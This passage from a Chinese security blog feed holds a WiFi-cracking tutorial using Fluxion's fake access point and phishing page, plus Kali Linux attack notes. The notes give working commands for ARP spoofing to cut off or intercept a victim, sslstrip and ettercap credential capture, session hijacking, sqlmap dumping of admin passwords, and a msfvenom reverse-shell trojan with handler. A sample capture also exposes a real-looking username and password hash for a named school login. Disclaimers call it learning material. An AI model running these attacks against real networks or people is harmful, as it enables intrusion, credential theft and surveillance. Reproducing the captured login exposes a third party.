i，没有绝对的安全系统》、《黑客军团》，为了让该推荐在该文章中更加的醒目些，以下博主推荐的连接内容务必前去看看，相当有意思的，不感兴趣的话那就算了(ノへ￣、)：</p><font color="red" size="15">https://baike.baidu.com/item/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/2136830?fr=aladdinhttps://baike.baidu.com/item/%E6%AC%BA%E9%AA%97%E7%9A%84%E8%89%BA%E6%9C%AF/10253577</font><p>好了，社会工程学介绍完了，我们来讲讲Flusion的使用吧（前面已经安装过了，忘了的可往回翻一翻）。<br><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=174774335,59681927&fm=26&gp=0.jpg" width="300"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/root/</span>   <span class="comment"># 进入root目录（根据自己的Fluxion安装路径）</span></span><br><span class="line"><span class="keyword">ls</span>  <span class="comment"># 列出当前所有文件，查看是否含有fluxion</span></span><br><span class="line"><span class="keyword">cd</span> fluxion  <span class="comment"># 进入fluxion</span></span><br><span class="line"><span class="keyword">ls</span>  <span class="comment"># 查看该项目内的文件，具体文件介绍可自行查找资料，这里接不说了</span></span><br><span class="line"><span class="string">./fluxion.sh</span>    <span class="comment"># 启动fluxion</span></span><br></pre></td></tr></table></figure><p>启动之后，你或许会看见如下内容：<br><img src="http://pjq6e477y.bkt.clouddn.com/12.jpg" width="400"></p><p>内容显示你当前kali中并没有安装相关插件，我们可通过如下进行安装：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install XXXXXX  # XXXXXX表示的是未安装的插件，比如apt-<span class="builtin-name">get</span> install bc，将所有的插件安装一遍即可</span><br></pre></td></tr></table></figure></p><p>安装之后我们再次执行fluxion:<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/root/fluxion</span> &amp;&amp; <span class="string">./fluxion.sh</span></span><br></pre></td></tr></table></figure></p><p>初次接触fluxion的朋友可能不知道怎么操作，但具体操作也没有那什么难度，所以这里就贴图简单的解释一下。</p><ul><li>选择语言<br><img src="http://pjq6e477y.bkt.clouddn.com/13.jpg" width="400"></li></ul><p>从上图我们可以看到有11个选项，每个选项对应一种语言操作，这里我们直接选择<code>6：chinese</code></p><ul><li>选择网卡<br><img src="http://pjq6e477y.bkt.clouddn.com/14.jpg" width="400"></li></ul><p>此处是网卡的选择，当你插上USB无线网卡并成功连接之后，虚拟机会自动监听，所以直接默认即可</p><ul><li>选择信道并开始监听<br><img src="http://pjq6e477y.bkt.clouddn.com/15.jpg" width="400"><br><img src="http://pjq6e477y.bkt.clouddn.com/16.jpg" width="400"></li></ul><p>这里我们选择所有信道，选择之后将会出现类似之前跑字典的信道界面，当看见你想要破解的wifi之后我们需要执行<code>ctrl+c</code>退出即可</p><ul><li>选择目标<br><img src="http://pjq6e477y.bkt.clouddn.com/17.jpg" width="400"></li></ul><p>选择目标wifi代号</p><ul><li>创建AP<br><img src="http://pjq6e477y.bkt.clouddn.com/18.jpg" width="400"></li></ul><p>因为这里我们使用的是社会工程学来进行欺骗，所以我们需要创建一个伪装AP来供目标连接，直接选择1即可</p><p>——————————————————————————————分割线——————————————————————————————</p><p>后面的内容就是真正的拦截过程，由于现在室友正在使用wifi，这里就暂时写到这了，以后有机会再来补充。简单的介绍一下吧：</p><p>首先执行生成一个<code>web</code>站点，该站点为钓鱼网站，主要用于目标登录其Wifi。我们执行命令之后，目标路由器或者交换机上所连接的设备将会自动断开，此后将会自动生成一个我们伪装的AP，待目标设备连接上该AP之后将会自动跳转到钓鱼站点，待其输入密码后我们既能在Kali终端下得到目标wifi的密码，得到密码之后程序将会自动终止，目标wifi也将恢复正常。</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是本文所有wifi的破解方法了，如果日后接触到了其他其他方法再在本文进行更新。最后，在这里再提醒一下：</p><p><font color="red">任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文只供学习，切勿用于非法操作，一切后果由使用者本人负责。</font></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1544806153437&di=fe3bcd2093a5fc81f192d946c618a173&imgtype=0&src=http%3A%2F%2Fwx4.sinaimg.cn%2Fbmiddle%2Fedadc0ebgy1fpn86qcibkj20hs0jkq69.jpg" width="300"></h2><div style="text-align: right">2018-10-12,By Zero</div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;免责申明&quot;&gt;&lt;a href=&quot;#免责申明&quot; class=&quot;headerlink&quot; title=&quot;免责申明&quot;&gt;&lt;/a&gt;免责申明&lt;/h2&gt;&lt;p&gt;正如&lt;a href=&quot;https://book.douban.com/subject/10433737/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《Metasploit渗透测试指南》&lt;/a&gt;一书所述：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不要进行恶意的攻击&lt;/li&gt;
&lt;li&gt;不要做傻事&lt;/li&gt;
&lt;li&gt;在没有获得书面授权时，不要攻击任何目标&lt;/li&gt;
&lt;li&gt;考虑你的行为将会带来的后果&lt;/li&gt;
&lt;li&gt;如果你干了些非法的事情，天网恢恢疏而不漏，你总会被抓到牢里的&lt;/li&gt;
&lt;/ul&gt;
&lt;font color=&quot;red&quot;&gt;任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文仅供学习，切勿用于非法操作，一切后果由使用者本人负责。&lt;/font&gt;

&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/bmiddle/006APoFYjw1fa506lcjg8j30b40b4aat.jpg&quot; width=&quot;300&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;目前，无论是在家，还是在校，亦或是各种商场，无线wifi都是星罗棋布。但你是否注意到，像CMCC、ChinaNet，亦或是其他一些表面上看上去比较信得过的wifi名（BSSID）很是常见，尤其是在人流量高、人口密度大的区域。此时的你或许会感到疑惑，但是当你看见Free字样再加上你目前对wifi的需求，一时昏了头的你可能就管不了那么多了（管他三七二十一，连上再说，Free的wifi不要白不要，我傻啊！！！）。令你始料未及的是一旦当你client那些钓鱼wifi之后，你的手机内的一切的一切的信息都在对方的掌控之中，比如说照片、通讯录、各种应用密码等，我们换句话说，你的手机在这一瞬间就相当于有了第二个主人。&lt;/p&gt;
&lt;p&gt;综上，在这鱼龙混杂的万千世界中了解一些网络安全的知识对于每个人来说都是有必要的。本文主要介绍无线渗透中的关于wifi破解一些常用方法以此加强您的自我防护意识。&lt;/p&gt;
    
    </summary>
    
      <category term="白帽子" scheme="https://muzimz.cn/categories/%E7%99%BD%E5%B8%BD%E5%AD%90/"/>
    
    
      <category term="Kali" scheme="https://muzimz.cn/tags/Kali/"/>
    
      <category term="Fluxion" scheme="https://muzimz.cn/tags/Fluxion/"/>
    
      <category term="wifi" scheme="https://muzimz.cn/tags/wifi/"/>
    
      <category term="airmon-ng" scheme="https://muzimz.cn/tags/airmon-ng/"/>
    
  </entry>
  
  <entry>
    <title>Kali基本操作</title>
    <link href="https://muzimz.cn/2018/09/28/Kali%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
    <id>https://muzimz.cn/2018/09/28/Kali基本操作/</id>
    <published>2018-09-28T05:54:02.000Z</published>
    <updated>2019-02-02T16:36:08.405Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以下内容为博主学习《Kali Linux渗透测试的艺术》一书所记录的笔记，有点凌乱、还未整理，有时间再来弄。</p></blockquote><h2 id="一、换源并安装open-vm-tools"><a href="#一、换源并安装open-vm-tools" class="headerlink" title="一、换源并安装open-vm-tools"></a>一、换源并安装open-vm-tools</h2><h3 id="1-1-打开sources-list文件"><a href="#1-1-打开sources-list文件" class="headerlink" title="1.1 打开sources.list文件"></a>1.1 打开sources.list文件</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/apt/sources.<span class="built_in">list</span></span><br></pre></td></tr></table></figure><h3 id="1-2-在文件中添加如下内容"><a href="#1-2-在文件中添加如下内容" class="headerlink" title="1.2 在文件中添加如下内容"></a>1.2 在文件中添加如下内容</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deb <span class="string">http:</span><span class="comment">//mirrors.edu.cn/kali sana main non-free contrib</span></span><br><span class="line">deb <span class="string">http:</span><span class="comment">//mirrors.edu.cn/kali-security/sana/updates main contrib non-free</span></span><br><span class="line">deb-src <span class="string">http:</span><span class="comment">//mirrors.ustc.edu.cn/kali-security/sana/updates main contrib non-free</span></span><br><span class="line">deb <span class="string">http:</span><span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free</span></span><br></pre></td></tr></table></figure><h3 id="1-3-更新并安装"><a href="#1-3-更新并安装" class="headerlink" title="1.3 更新并安装"></a>1.3 更新并安装</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br><span class="line">apt-<span class="built_in">get</span> install <span class="keyword">open</span>-<span class="keyword">vm</span>-tools-desktop fuse</span><br></pre></td></tr></table></figure><h2 id="二、安装中文输入"><a href="#二、安装中文输入" class="headerlink" title="二、安装中文输入"></a>二、安装中文输入</h2><h3 id="2-1-下载搜狗"><a href="#2-1-下载搜狗" class="headerlink" title="2.1 下载搜狗"></a>2.1 下载搜狗</h3><p>在pinyin.sogou.com/linux中下载搜狗</p><h3 id="2-2-安装"><a href="#2-2-安装" class="headerlink" title="2.2 安装"></a>2.2 安装</h3><p>终端进入上方文件路径，执行如下：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解决依赖：apt-<span class="builtin-name">get</span> install -f</span><br><span class="line">安装：dpkg -i 包名</span><br></pre></td></tr></table></figure></p><h2 id="三、美化kali"><a href="#三、美化kali" class="headerlink" title="三、美化kali"></a>三、美化kali</h2><p>图标位置：/usr/share/icons/<br>主题位置：/usr/share/themes/</p><h3 id="四、局域网断网攻击"><a href="#四、局域网断网攻击" class="headerlink" title="四、局域网断网攻击"></a>四、局域网断网攻击</h3><h3 id="4-1-欺骗"><a href="#4-1-欺骗" class="headerlink" title="4.1 欺骗"></a>4.1 欺骗</h3><p>欺骗命令如下：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -<span class="selector-tag">i</span> 网卡 -t 被骗目标ip 网关</span><br></pre></td></tr></table></figure></p><p>欺骗命令执行之前需要桥接自己的kali网络，其桥接过程如下：</p><ol><li>右键kali系统，点开设置</li><li>将网络适配器设置成桥接模式</li><li>一次点开：编辑 -&gt; 虚拟网络编辑器 -&gt; vmnet0 -&gt; 确定</li></ol><p>参数解读：</p><ol><li>网卡：网卡是kali的网卡名，可以使用ifconfig查看（可见eth0）</li><li>被骗目标ip：受害者的ip，windows用户可以使用ipconfig查看</li><li>网关：网关是一个中间载体，同样可以使用ipconfig查看（默认网关）</li></ol><p>ip查询：我们在对受害者进行arp欺骗的时候，往往是不知道对方的ip的，但是我么可以使用如下命令偷偷的查询对方ip：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -asg <span class="number">192.168</span><span class="number">.31</span><span class="number">.0</span>/<span class="number">24</span> <span class="comment">//网关最后是0+24</span></span><br></pre></td></tr></table></figure></p><h3 id="4-2-攻击"><a href="#4-2-攻击" class="headerlink" title="4.2 攻击"></a>4.2 攻击</h3><h4 id="4-2-1-瘫痪对方的电脑"><a href="#4-2-1-瘫痪对方的电脑" class="headerlink" title="4.2.1 瘫痪对方的电脑"></a>4.2.1 瘫痪对方的电脑</h4><p>执行上述命令，即可让对方的网络瘫痪：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -<span class="selector-tag">i</span> 网卡 -t 被骗目标ip 网关</span><br></pre></td></tr></table></figure><p>执行之后，对方就无法正常使用网络了（比如访问网页、qq聊天等等一切网络活动），ctrl+z之后取消瘫痪操作</p><h4 id="4-2-2-劫持对方的请求（账号，密码之类的）"><a href="#4-2-2-劫持对方的请求（账号，密码之类的）" class="headerlink" title="4.2.2 劫持对方的请求（账号，密码之类的）"></a>4.2.2 劫持对方的请求（账号，密码之类的）</h4><p>这里的劫持与上后面的瘫痪有点不同，劫持的话不能让对方网络瘫痪，所以我们在劫持之前需要进行如下命令操作（ip流量转发）：<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /proc/sys/net/ipv4/  # 进入该目录</span><br><span class="line">cat ip_forward  # 查看属性值，会发现输出<span class="number">0</span>（默认是<span class="number">0</span>，我们需要更改为<span class="number">1</span>）</span><br><span class="line">echo <span class="number">1</span> &gt; ip_forward```# 将ip_forward值改为<span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>如上操作之后我们继续执行arpspoof欺骗：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -<span class="selector-tag">i</span> 网卡 -t 被骗目标ip 网关</span><br></pre></td></tr></table></figure></p><p>在欺骗之后，我们执行如下命令来进行嗅探：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -<span class="selector-tag">i</span> eth0</span><br></pre></td></tr></table></figure></p><p>执行之后发现，虽然这次对方可以正常使用网络，但是他的电脑已经在我们的监控中了，比如目标登录自己的某个站点，则在kali的终端上会输出对方的账号及密码</p><h4 id="4-2-4-嗅探对方的浏览图片"><a href="#4-2-4-嗅探对方的浏览图片" class="headerlink" title="4.2.4 嗅探对方的浏览图片"></a>4.2.4 嗅探对方的浏览图片</h4><p>在进行上述的ip流量转发之后，我们可以使用如下命令来截取对方浏览页面的图片：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -<span class="selector-tag">i</span> eth0</span><br></pre></td></tr></table></figure></p><p>执行之后，会出现一个窗口    ，该窗口用于显示对方浏览页面的图片，并会将图片保存至kali本地</p><h2 id="五、https账号、密码获取"><a href="#五、https账号、密码获取" class="headerlink" title="五、https账号、密码获取"></a>五、https账号、密码获取</h2><h3 id="5-1-准备工作"><a href="#5-1-准备工作" class="headerlink" title="5.1 准备工作"></a>5.1 准备工作</h3><h4 id="5-1-1-Vim：文本编辑器"><a href="#5-1-1-Vim：文本编辑器" class="headerlink" title="5.1.1 Vim：文本编辑器"></a>5.1.1 Vim：文本编辑器</h4><p>进入文件进行编辑：vim 123.txt （不存在会自动创建）<br>退出文件编辑：</p><ol><li>按ESC </li><li>shift+： </li><li><ol><li>输入q！   # 不保存退出</li></ol></li></ol><p>打开 etterc.conf文件<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>ettercap<span class="regexp">/ettc.conf/</span></span><br></pre></td></tr></table></figure></p><p>移动光标，把linux设置一下，将redir前的注释符删掉<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">if</span> you use iptables:</span><br><span class="line">   #redir_command_on = <span class="string">"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"</span></span><br><span class="line">   #redir_command_off = <span class="string">"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"</span></span><br></pre></td></tr></table></figure></p><p>刚开始是不能编辑的，编辑操作如下</p><ul><li><p>vim编辑：按一下 i 就可以对文件进行编辑了，在上述所述的位置将两个#去掉</p></li><li><p>vim保存：按一下ESC键，再按shift+:键，继续如下：</p></li></ul><ol><li>wq   保存并退出</li><li>q!   不保存并退出</li></ol><h4 id="5-1-2-开启ssh："><a href="#5-1-2-开启ssh：" class="headerlink" title="5.1.2 开启ssh："></a>5.1.2 开启ssh：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/etc/i</span>nitd<span class="regexp">/ssh start</span></span><br></pre></td></tr></table></figure><h4 id="5-1-3-sslstrip工具"><a href="#5-1-3-sslstrip工具" class="headerlink" title="5.1.3 sslstrip工具"></a>5.1.3 sslstrip工具</h4><p>这个工具能够把https的链接还原为http。<br>执行命令：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -<span class="selector-tag">a</span> -f -k</span><br></pre></td></tr></table></figure></p><p>参数说明：</p><ol><li>-a</li><li>-f</li><li>-k</li></ol><h3 id="5-2-截取账号及密码"><a href="#5-2-截取账号及密码" class="headerlink" title="5.2 截取账号及密码"></a>5.2 截取账号及密码</h3><ul><li><p>执行欺骗操作</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">arpspoof</span> <span class="selector-tag">-i</span> <span class="selector-tag">eth0</span> <span class="selector-tag">-t</span> 192<span class="selector-class">.168</span><span class="selector-class">.31</span><span class="selector-class">.117</span> 192<span class="selector-class">.168</span><span class="selector-class">.31</span><span class="selector-class">.1</span></span><br></pre></td></tr></table></figure></li><li><p>执行sslstrip</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -<span class="selector-tag">a</span> -f -k</span><br></pre></td></tr></table></figure></li><li><p>执行ettercap</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -<span class="selector-tag">i</span> eth0</span><br></pre></td></tr></table></figure></li><li><p>当目标用户登录https登录的时候就可以在kali终端获取到他的账号以及密码，例子如下：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP : <span class="number">211.80</span><span class="number">.112</span><span class="number">.41</span>:<span class="number">80</span> -&gt; </span><br><span class="line"><span class="symbol">USER:</span> <span class="number">1620814</span>  </span><br><span class="line"><span class="symbol">PASS:</span> <span class="number">741948</span>a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a  </span><br><span class="line"><span class="symbol">INFO:</span> mids.gench.edu.cn/_customize/passLogin</span><br><span class="line"><span class="symbol">CONTENT:</span> loginTicket=<span class="number">425</span>d9c18<span class="number">-424</span>b<span class="number">-418</span>d-b027<span class="number">-2095e618</span>f829<span class="variable">&amp;username</span>=<span class="number">1620814</span><span class="variable">&amp;password</span>=<span class="number">741948</span>a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a</span><br></pre></td></tr></table></figure></li></ul><p>分析：</p><ol><li>HTTP：ip及端口</li><li>USER：用户名</li><li>PASS：登录密码，注意：这里的密码并不是明文的，他是经过加密的，至于如何解密这个密码，以后有时间再来介绍</li><li>CONTENT：参数的组合</li></ol><h2 id="六、回话劫持，登录目标站点"><a href="#六、回话劫持，登录目标站点" class="headerlink" title="六、回话劫持，登录目标站点"></a>六、回话劫持，登录目标站点</h2><h3 id="6-1-工具准备"><a href="#6-1-工具准备" class="headerlink" title="6.1 工具准备"></a>6.1 工具准备</h3><ol><li>arpspoof     欺骗</li><li>wireshark        抓包</li><li>ferret       重新生成抓包后的文件</li><li>hamster</li></ol><p>ferret安装，一次执行如下：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-<span class="builtin-name">get</span> update &amp;&amp; apt-<span class="builtin-name">get</span> install ferret-sidejack:i386</span><br><span class="line">apt-<span class="builtin-name">get</span> clean &amp;&amp; apt-<span class="builtin-name">get</span> update &amp;&amp; apt-<span class="builtin-name">get</span><span class="built_in"> upgrade </span>-y &amp;&amp; apt-<span class="builtin-name">get</span> dist-upgrade -y</span><br><span class="line">apt install ferret -y</span><br></pre></td></tr></table></figure></p><h3 id="6-2-过程（方法一）"><a href="#6-2-过程（方法一）" class="headerlink" title="6.2 过程（方法一）"></a>6.2 过程（方法一）</h3><ul><li>arpspoof欺骗</li><li><p>启动wireshark</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wireshark</span></span><br></pre></td></tr></table></figure></li><li><p>点击eth0网卡，并让他持续运行下去</p></li><li>目标登录某个站点（上钩）</li><li>为了防止延迟，让wireshark再运行一段时间之后停掉wireshark</li><li>保存文件名为cookie至桌面，并格式为wireshark…….pacp</li><li><p>终端进入桌面，并执行如下命令（这个ferret有点问题，在这记录一下，以后再来看）：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ferret</span> <span class="selector-tag">-r</span> <span class="selector-tag">cookie</span><span class="selector-class">.pcap</span></span><br></pre></td></tr></table></figure></li><li><p>执行hamster，会看到要求我们把代理改成本地（127.0.0.1）的，然后端口为1234</p></li></ul><ol><li>代开kali内置的火狐浏览器</li><li>点击设置 -&gt; Advanced -&gt; Network -&gt; Settings -&gt; 勾选Manual……并将http proxy改为127.0.0.1：1234</li></ol><ul><li>在kali中访问127.0.0.1：1234</li><li>之后会发现有个欺骗的ip，点开后就会出现很多的链接，ctrl+f找到</li></ul><h3 id="6-3-过程（方法二）"><a href="#6-3-过程（方法二）" class="headerlink" title="6.3 过程（方法二）"></a>6.3 过程（方法二）</h3><ul><li>ferret -i eth0</li><li>以后在记录</li></ul><h2 id="七、SQLMAP注入，ASP、PHP网站渗透"><a href="#七、SQLMAP注入，ASP、PHP网站渗透" class="headerlink" title="七、SQLMAP注入，ASP、PHP网站渗透"></a>七、SQLMAP注入，ASP、PHP网站渗透</h2><h3 id="7-1-科普"><a href="#7-1-科普" class="headerlink" title="7.1 科普"></a>7.1 科普</h3><h4 id="7-1-1-ASP"><a href="#7-1-1-ASP" class="headerlink" title="7.1.1 ASP"></a>7.1.1 ASP</h4><p>ASP即Active Server Pages，是MicroSoft公司开发的服务器端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序。当服务器收到对ASP文件的请求时，它会处理包含在用于构建发送给浏览器的HTML（Hyper Text Markup Language，超文本置标语言）网页文件中的服务器端脚本代码。除服务器端脚本代码外，ASP文件也可以包含文本、HTML（包括相关的客户端脚本）和com组件调用。 [1-2]<br>ASP简单、易于维护 ， 是小型页面应用程序的选择 ，在使用DCOM （Distributed Component Object Model）和 MTS（Microsoft Transaction Server）的情况下， ASP甚至可以实现中等规模的企业应用程序。 [3] </p><h4 id="7-1-2-PHP"><a href="#7-1-2-PHP" class="headerlink" title="7.1.2 PHP"></a>7.1.2 PHP</h4><p>PHP（外文名:PHP: Hypertext Preprocessor，中文名：“超文本预处理器”）是一种通用开源脚本语言。语法吸收了C语言、Java和Perl的特点，利于学习，使用广泛，主要适用于Web开发领域。PHP 独特的语法混合了C、Java、Perl以及PHP自创的语法。它可以比CGI或者Perl更快速地执行动态网页。用PHP做出的动态页面与其他的编程语言相比，PHP是将程序嵌入到HTML（标准通用标记语言下的一个应用）文档中去执行，执行效率比完全生成HTML标记的CGI要高许多；PHP还可以执行编译后代码，编译可以达到加密和优化代码运行，使代码运行更快。</p><h3 id="7-2-ASP渗透"><a href="#7-2-ASP渗透" class="headerlink" title="7.2 ASP渗透"></a>7.2 ASP渗透</h3><ul><li>监测是否存在注入<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -u 网站</span><br></pre></td></tr></table></figure></li></ul><p>如果该目标网站有注入，则会返回数据库的各种信息。</p><ul><li><p>拆解目标网站的数据库表</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 网站 <span class="comment">--tables</span></span><br></pre></td></tr></table></figure></li><li><p>根据User表拆解列名</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlamp -u 网站 --<span class="built_in">columns</span> -<span class="built_in">T</span> <span class="string">"user"</span></span><br></pre></td></tr></table></figure></li><li><p>username拆解出来后就不需要再进行拆解了</p></li><li>得到目标网站后台管理员的登录密码<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sqlmap </span>-u 目标网站 <span class="built_in">--dump</span> -C <span class="string">"username,password"</span> -T <span class="string">"user"</span></span><br></pre></td></tr></table></figure></li></ul><p>—dump：下载数据<br>-C “username,password” 列名</p><h3 id="7-3-PHP渗透"><a href="#7-3-PHP渗透" class="headerlink" title="7.3 PHP渗透"></a>7.3 PHP渗透</h3><p>待更新</p><h3 id="7-4-Cookie渗透"><a href="#7-4-Cookie渗透" class="headerlink" title="7.4 Cookie渗透"></a>7.4 Cookie渗透</h3><p>待更新</p><h2 id="八、Metasplooit"><a href="#八、Metasplooit" class="headerlink" title="八、Metasplooit"></a>八、Metasplooit</h2><h3 id="8-1-基本操作"><a href="#8-1-基本操作" class="headerlink" title="8.1 基本操作"></a>8.1 基本操作</h3><ul><li>启动：msfconsole</li><li>漏洞利用工具：exploit</li><li>漏洞执行后的demo：payloads</li></ul><h3 id="8-2-远程控制软件"><a href="#8-2-远程控制软件" class="headerlink" title="8.2 远程控制软件"></a>8.2 远程控制软件</h3><h4 id="8-2-1-实现过程"><a href="#8-2-1-实现过程" class="headerlink" title="8.2.1 实现过程"></a>8.2.1 实现过程</h4><ul><li><p>根据自己的ip设定一个木马（旧版使用msfpayload 不是 msfvenom -p），本操作是在桌面路径下执行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 <span class="attribute">LHOST</span>=kali的ip <span class="attribute">LPORT</span>=55555 -f exe &gt; test.exe</span><br></pre></td></tr></table></figure></li><li><p>之后会生成一个test.exe木马程序，将文件拖至windows平台上</p></li><li><p>使用handler模块，本操作以及之后的操作是在msfconsole下执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/multi/<span class="keyword">handler</span></span><br></pre></td></tr></table></figure></li><li><p>用shellcode程序</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> PAYLOAD <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br></pre></td></tr></table></figure></li><li><p>查看</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">show options</span></span><br></pre></td></tr></table></figure></li><li><p>设置参数，比如设置ip和端口</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> LHOST 自己的<span class="comment">ip</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT</span> 端口（<span class="comment">55555</span>）</span><br></pre></td></tr></table></figure></li><li><p>执行并等待目标上钩</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">exploit</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="8-2-2-木马基本功能"><a href="#8-2-2-木马基本功能" class="headerlink" title="8.2.2 木马基本功能"></a>8.2.2 木马基本功能</h4><p>当用户点击您的鱼饵之后，您就拥有了对方的所有权限，一下是一些基本的操作：</p><ul><li>sysinfo：获取到对方设备的系统信息</li><li>shell获取受害者的终端权限，通过这个终端您就可以完全控制对方的设备</li><li>background：将该权限放到后台，通过session -l（小写字母I） 1来重新获取会话</li><li>run vnc：开启远程桌面，执行之后就可以看到对方完整的桌面了。</li><li>注入进程</li></ul><ol><li>得到要注入的pid进程：ls</li><li>migrate XXX（pid）注入</li></ol><h3 id="8-2-3-文件管理功能"><a href="#8-2-3-文件管理功能" class="headerlink" title="8.2.3 文件管理功能"></a>8.2.3 